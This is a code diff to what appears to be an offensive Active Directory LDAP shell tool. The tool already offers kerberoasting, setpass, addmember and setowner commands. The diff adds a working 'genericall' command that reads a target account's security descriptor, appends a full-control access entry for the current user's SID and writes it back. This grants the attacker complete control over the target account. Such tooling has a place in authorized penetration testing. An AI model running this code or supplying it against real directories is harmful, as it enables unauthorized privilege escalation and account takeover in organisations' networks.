@@ -21,7 +21,7 @@ COMMANDS = [
     "sessions", "status", "query", "history", "batch_lookup",
     "categories", "groups", "users", "computers", "kerberoasting", "checkacl", "addmember",
     "setpass", "help", "exit", "savepassword", "show_all_history", "offline_search", "shares",
-    "get_sid", "getgmsa", "setowner"
+    "get_sid", "getgmsa", "setowner", "genericall"
 ]
 
 def shell_completer(text, state):
@@ -584,6 +584,60 @@ def cmd_setowner(conn, base_dn, target_user, sess_user):
         print(f"[bold green][+] Successfully took ownership of '{target_user}'[/bold green]")
     else:
         print(f"[bold red][-] Failed to change owner: {conn.result['description']}[/bold red]")
+def cmd_genericall(conn, base_dn, target_user, sess_user):
+    print(f"[*] Attempting to grant GenericAll on '{target_user}' to '{sess_user}'")
+
+    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
+    if not conn.entries:
+        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
+        return
+    session_sid_raw = conn.entries[0]['objectSid'].raw_values[0]
+
+    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
+    if not conn.entries:
+        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
+        return
+    target_dn = conn.entries[0].distinguishedName.value
+
+    from ldap3.protocol.microsoft import security_descriptor_control
+    ctrls = security_descriptor_control(sdflags=0x04)
+
+    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)
+
+    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
+        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions! [/bold red]")
+        return
+
+    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
+
+    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK
+    sd = SR_SECURITY_DESCRIPTOR()
+    sd.fromString(current_sd_raw)
+
+    nace = ACE()
+    nace['AceType'] = 0x00
+    nace['AceFlags'] = 0x00
+
+    acedata = ACCESS_ALLOWED_ACE()
+    acedata['Mask'] = ACCESS_MASK()
+    acedata['Mask']['Mask'] = 983551
+    acedata['Sid'] = LDAP_SID(session_sid_raw)
+
+    nace['Ace'] = acedata
+
+    sd['Dacl'].aces.append(nace)
+    new_sd_raw = sd.getData()
+
+    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}
+
+    conn.modify(target_dn, changes, controls=ctrls)
+
+    if conn.result["result"] == 0:
+        print(f"[bold green][+] Successfully granted GenericAll on '{target_user}' to '{sess_user}'[/bold green]")
+
+    else:
+        print(f"[bold red][-] Failed to grant GenericAll: {conn.result['description']}[/bold red]")
+
 def kerberoastable(conn, base_dn):
     conn.search(base_dn, "(&(objectClass=user)(!(objectClass=computer))(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))", attributes=["sAMAccountName", "servicePrincipalName"])
     print("\n[bold red]Kerberoastable Accounts[/bold red]")
@@ -1224,7 +1278,20 @@ def connect(connection):
                 cmd_setowner(current_session["conn"], current_session["base_dn"], target, session_username)
             except Exception as e:
                 print(f"[-] Error setting owner : {e}")
+        elif command[0] == "genericall":
+            if not current_session:
+                print("No active session! Please 'use' a session or 'connect' first.")
+                continue
+            if len(command) < 2:
+                print("genericall <target_account>")
+                continue
+            target = command[1]
+            session_username = current_session["username"]
 
+            try:
+                cmd_genericall(current_session["conn"], current_session["base_dn"], target, session_username)
+            except Exception as e:
+                print(f"[-] Error adding Genericall: {e}")
         elif command[0] == "exit":
             break
         else:
